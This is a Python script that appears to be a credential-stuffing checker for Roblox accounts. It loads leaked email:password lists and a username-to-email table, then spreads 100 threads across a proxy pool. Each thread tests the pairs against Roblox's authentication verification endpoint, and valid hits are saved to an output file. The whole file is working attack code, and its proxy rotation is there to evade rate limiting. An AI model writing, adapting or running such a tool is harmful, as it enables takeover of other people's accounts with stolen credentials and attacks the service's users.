from structures import ComboQueue, ProxyPool, Counter
from itertools import cycle
import threading
import json
import time
import ctypes
import os

THREAD_COUNT = 100
PRINT_FAILS = False
PRINT_EXCEPTIONS = False

combos = ComboQueue()
counter = Counter()

username_to_email = {}
email_to_username = {}

combos_checked = 0
combos_length = 0

if not os.path.isdir("output"):
    os.mkdir("output")

with open("translate.txt", encoding="UTF-8", errors="ignore") as fp:
    for line_num, line in enumerate(fp.read().splitlines()):
        try:
            email, username = line.split(":", 1)
            username_to_email[username.lower()] = email
            email_to_username[email.lower()] = username
        except Exception as err:
            print(f"error while loading line {line_num+1} in translate: {err} {type(err)}")

with open("combos.txt", encoding="UTF-8", errors="ignore") as fp:
    for line_num, line in enumerate(fp.read().splitlines()):
        try:
            credential, password = line.split(":", 1)

            if not "@" in credential:
                if not credential.lower() in username_to_email:
                    raise Exception(f"'{credential}' is not an email and is not present in the translation table, ignored")
                credential = username_to_email[credential.lower()]
            
            combos.add(credential, password)

        except Exception as err:
            print(f"error while loading line {line_num+1} in combos: {err} {type(err)}")
    
    combos.process()
    combos_length = combos.size()

with open("proxies.txt", encoding="UTF-8", errors="ignore") as fp:
    proxies = fp.read().splitlines()
    proxies = ProxyPool(proxies)

def report_potential(credential, password):
    if "@" in credential and credential.lower() in email_to_username:
        credential = email_to_username[credential.lower()]
    
    with open("output/potentials.txt", "a", encoding="UTF-8", errors="ignore") as fp:
        fp.write(f"{credential}:{password}\n")
        fp.flush()

class TitleThread(threading.Thread):
    def run(self):
        while combos_length > combos_checked:
            time.sleep(0.1)
            try:
                ctypes.windll.kernel32.SetConsoleTitleW("  |  ".join([
                    f"Progress: {combos_checked}/{combos_length}",
                    f"CPM: {counter.get_cpm()}"
                ]))
            except:
                pass

class Thread(threading.Thread):
    def __init__(self):
        super().__init__()

    def run(self):
        global combos_checked

        while True:
            try:
                credential, password = next(combos)
            except:
                break
            
            try:
                with next(proxies) as proxy:
                    conn = proxy.get_connection("auth.roblox.com")
                    conn.putrequest("GET", f"/v1/credentials/verification?request.credentialType=Email&request.credentialValue={credential}&request.password={password}")
                    conn.endheaders()

                    resp = conn.getresponse()
                    data = resp.read()

                    if resp.status != 200:
                        raise Exception(f"Invalid status code {resp.status}")

                    data = json.loads(data)
                    
                    if not "canSend" in data:
                        raise Exception(f"Unusual response {data}")

                    combos_checked += 1
                    counter.add()

                    if data["canSend"]:
                        print(f"[POTENTIAL] {credential}:{password}")
                        report_potential(credential, password)
                    else:
                        if PRINT_FAILS:
                            print(f"[FAILED] {credential}:{password}")

            except Exception as err:
                combos.add(credential, password)
                if PRINT_EXCEPTIONS:
                    print(err, type(err))

def main():
    TitleThread().start()
    threads = [Thread() for _ in range(THREAD_COUNT)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()